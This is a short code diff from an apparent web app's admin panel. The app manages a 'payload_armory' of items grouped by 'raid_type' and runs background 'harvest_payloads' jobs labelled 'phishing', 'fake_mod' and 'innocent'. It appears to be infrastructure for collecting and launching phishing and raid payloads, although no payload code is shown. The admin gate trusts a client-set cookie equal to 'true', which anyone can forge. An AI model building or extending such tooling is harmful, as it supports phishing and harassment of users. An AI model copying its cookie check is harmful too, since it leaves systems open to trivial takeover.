@@ -217,7 +217,8 @@ async def admin_panel(request: Request, key: str = None):
         return response
     if admin_auth != "true": return HTMLResponse("Unauthorized", status_code=403)
     
-    payloads = await payload_armory.find().sort("created_at", -1).to_list(100)
+    # Sort by raid_type to group them, then by newest
+    payloads = await payload_armory.find().sort([("raid_type", 1), ("created_at", -1)]).to_list(150)
     db = payload_armory.database
     collection_names = await db.list_collection_names()
     db_structure = {}
@@ -244,7 +245,8 @@ async def toggle_bot(request: Request):
 async def admin_force_harvest(request: Request, bg_tasks: BackgroundTasks):
     if request.cookies.get("admin_auth") != "true": return RedirectResponse("/")
     bg_tasks.add_task(harvest_payloads, "phishing")
-    bg_tasks.add_task(harvest_payloads, "ping")
+    bg_tasks.add_task(harvest_payloads, "fake_mod")
+    bg_tasks.add_task(harvest_payloads, "innocent")
     return RedirectResponse("/admin?tab=armory", status_code=303)
 
 @app.post("/admin/delete_payload/{payload_id}")
